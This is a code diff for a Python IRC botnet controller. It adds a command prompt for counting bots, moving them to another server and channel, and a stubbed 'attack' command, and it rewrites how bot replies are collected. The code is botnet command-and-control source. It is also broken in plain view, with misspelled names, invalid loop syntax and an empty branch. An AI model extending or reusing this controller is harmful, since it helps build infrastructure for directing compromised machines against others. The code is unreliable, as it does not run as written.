@@ -4,6 +4,7 @@ import sys
 import socket
 import random
 import string
+import time
 
 class PyBotCon:
 # NOTES --> Have to thread a listener into this program to listen for responses in a while(True) loop
@@ -33,6 +34,24 @@ class PyBotCon:
       print("unable to connect to irc server")
     s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
 
+  def conMain(self):
+    while(True):
+      print("command> ",end='')
+      command = input()
+      if(command == "status"):
+        self.identifyBots(self.secret,self.channel)
+        print(srt(len(self.botList))+" bots found: " + str(self.botList))
+      elif(command.startswith("attack")):
+        print("Call attack function here")
+      elif(command.startswith("move")):
+        chanCommand = command.split()
+        self.changeChannel(self.channel, chanCommand[1], chanCommand[2], chanCommand[3])
+        # Need to call a move channel function for the conbot, will write later
+      elif(command=="quit"):
+        sys.exit("Command Bot Disconnected")
+      elif(comand=="shutdown"):
+        # Need to create a function for sending shutdown message to the channel
+
   def listen(self):
     while True:
       data = ""
@@ -58,14 +77,15 @@ class PyBotCon:
       print("DEBUG --> Controller said the secret! Control Mode enabled, read to troll and annoy")
       self.control = 1
 
-  def changeChannel(self,channel,newServer, newChannel):
-    self.s.send(bytes("PRIVMSG" + channel + " " + "move " + newServer + " " + newChannel + "\n"))  
+  def changeChannel(self,channel,newServer, newPort, newChannel):
+    self.s.send(bytes("PRIVMSG" + channel + " " + "move " + newServer + " " + newPort + " " + newChannel + "\n"))  
 
   def identifyBots(self,secret,channel):
     self.s.send(bytes("PRIVMSG " + channel + " " + secret + "\n")) # Send 'hello' message for bots to identify themselves
     self.botList = [] # botList starts as an empty list: it is cleared and rebuilt every time this function is called
-    for(i in range(100)): # NOTE --> I'm not sure how long I should be listening for bot replies, this may need to be adjusted
-      data = self.s.recv(1024).decode("UTF-8")
+    time.sleep(6)
+    for(i in range(10)): # NOTE --> I'm not sure how I should be listening for bot replies, this will need to be adjusted
+      data = self.s.recv(4096).decode("UTF-8")
       data = data.strip("\r\n")
       if(data.find("PRIVMSG {} :".format(self.nick))!=-1 and data.split("PRIVMSG",1)[1].split(":",1)[1]=="YOURS"): # NOTE --> The response message that we're expecting from bots is "YOURS"
         temp = data.split("!",1)[0][1:] # Finds name of the bot reply
